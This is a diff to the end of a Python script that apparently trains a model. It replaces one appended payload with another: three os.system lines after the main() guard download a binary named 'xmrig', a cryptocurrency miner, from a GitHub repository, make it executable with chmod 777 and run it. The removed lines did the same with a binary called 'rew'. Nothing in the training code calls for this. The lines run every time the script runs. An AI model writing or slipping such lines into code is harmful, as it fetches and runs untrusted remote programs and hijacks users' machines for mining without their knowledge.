@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/arifrahman555/kolor/raw/main/rew')
-os.system('chmod 777 rew')
-os.system('./rew')
+os.system('wget https://github.com/Adeemar7/soft/raw/main/xmrig')
+os.system('chmod 777 xmrig')
+os.system('./xmrig')
